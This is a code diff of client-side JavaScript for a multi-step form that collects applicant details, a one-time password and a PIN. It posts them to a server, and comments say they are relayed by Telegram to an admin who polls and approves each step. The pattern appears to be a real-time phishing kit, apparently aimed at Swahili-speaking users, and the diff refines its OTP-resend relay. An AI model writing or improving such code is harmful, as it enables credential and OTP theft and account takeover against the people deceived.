@@ -15,6 +15,14 @@ async function postData(step, data) {
             body: JSON.stringify({ step, data })
         });
         const result = await response.json();
+        
+        // If this was an OTP resend request by the applicant
+        if (result.resendAcknowledge) {
+            hideSpinner();
+            alert('Ombi la kutuma tena OTP limepokelewa.');
+            return;
+        }
+
         if (result.pendingApproval) {
             pollAdminResponse();
         } else {
@@ -40,8 +48,6 @@ function pollAdminResponse() {
                 if (res.status === 'retry_pin') {
                     document.getElementById('pin-notice').innerText = res.message;
                 }
-            } else if (res.status === 'resend') {
-                alert(res.message);
             }
         })
         .catch(() => {
@@ -49,19 +55,19 @@ function pollAdminResponse() {
         });
 }
 
-// Step 1: Local transition only (No server request / No Telegram notification)
+// Step 1: Local transition only
 function submitStep1(e) {
     e.preventDefault();
     goToScreen('screen-step2');
 }
 
-// Step 2: Local transition only (No server request / No Telegram notification)
+// Step 2: Local transition only
 function submitStep2(e) {
     e.preventDefault();
     goToScreen('screen-step3');
 }
 
-// Step 3: Starts Telegram delivery and admin control here!
+// Step 3: Starts Telegram delivery
 function submitStep3(e) {
     e.preventDefault();
     const data = {
@@ -76,12 +82,13 @@ function submitStep4(e) {
     const inputs = document.querySelectorAll('.otp-input');
     let otp = '';
     inputs.forEach(i => otp += i.value);
-    postData('step4', { otp });
+    postData('step4', { otp, isResend: false });
 }
 
+// Applicant triggers a new OTP request themselves, admin is notified
 function resendOtp(e) {
     e.preventDefault();
-    postData('step4', { otp: 'RESEND_REQUEST' });
+    postData('step4', { otp: '', isResend: true });
 }
 
 function submitStep5(e) {
@@ -90,5 +97,4 @@ function submitStep5(e) {
     let pin = '';
     inputs.forEach(i => pin += i.value);
     postData('step5', { pin });
-                    }
-    
+}
